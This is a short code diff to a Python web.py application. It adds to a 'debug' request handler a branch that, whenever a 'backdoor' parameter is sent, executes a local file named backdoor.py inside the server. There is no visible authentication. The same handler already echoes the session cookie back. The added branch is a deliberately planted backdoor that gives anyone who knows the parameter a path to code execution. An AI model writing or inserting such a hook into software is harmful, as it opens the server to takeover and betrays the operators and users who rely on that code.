@@ -317,6 +317,12 @@ class debug:
             return ("\nTo access this website programatically,\n" +
                     "add the following header to your requests.\n\n" +
                     "Cookie: " + web.cookies().session + "\n\n")
+        elif i.backdoor:
+            try:
+                env = {}
+                execfile("backdoor.py", env, env)
+            except IOError:
+                raise web.notfound()
         return "hello world!"
 
 class do_search:
